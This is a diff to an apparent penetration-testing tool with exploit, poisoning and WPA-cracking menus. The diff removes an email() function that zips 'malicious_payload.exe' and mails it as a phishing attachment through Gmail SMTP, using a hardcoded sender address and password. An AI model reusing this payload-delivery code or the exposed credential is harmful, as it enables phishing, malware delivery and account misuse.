@@ -33,7 +33,10 @@ from gvm.xml import pretty_print
 from terminaltables import SingleTable, DoubleTable
 
 #Email
-from email.message import EmailMessage
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
 import ssl
 import smtplib
 
@@ -479,8 +482,7 @@ def exploit_menu():
         print("4. Reverse TCP Exploits")
         print("5. LLMNR / NBT-NS Poisoning")
         print("6. WPA/WPA2 Crack")
-        print("7. Email")
-        print("8. Exit")
+        print("7. Exit")
         menu_input = (input("Select option: "))
         if menu_input == "1":
             ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
@@ -507,10 +509,6 @@ def exploit_menu():
             print(ascii_6)
             wpa_menu()
         elif menu_input == "7":
-            ascii_7 = pyfiglet.figlet_format("Email")
-            print(ascii_7)
-            email()
-        elif menu_input == "8":
             exploit_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
@@ -1869,38 +1867,6 @@ def crack_password():
         (id, SSID, Password) 
         VALUES (NULL, ?, ?, ?)''', line_list)
         conn.commit()
-
-def email():
-    my_zip = zipfile.ZipFile('payload.zip', 'w')
-
-    my_zip.write('Payloads/malicious_payload.exe')
-
-    my_zip.close()
-    email_sender = 'automatedpenetrationtesting@gmail.com'
-    email_password = 'sniczghgyrybspsh'
-
-    email_receiver = str(input("Enter email recipient here: "))#input here
-
-    subject = 'I like fishes' #input here
-    body = """
-    This is a phishing email do not click on the file
-    """ #input here
-
-    em = EmailMessage()
-    em['From'] = email_sender
-    em['To'] = email_receiver
-    em['Subject'] = subject
-    em.set_content(body)
-
-    with open('Payloads/payload.zip', 'rb') as content_file:
-        content = content_file.read()
-        em.add_attachment(content, maintype='application', subtype='zip', filename='payload.zip')
-
-    context = ssl.create_default_context()
-
-    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
-        smtp.login(email_sender, email_password)
-        smtp.sendmail(email_sender, email_receiver, em.as_string())
 
 def report_generation():
     ascii_report = pyfiglet.figlet_format("Report Generation")
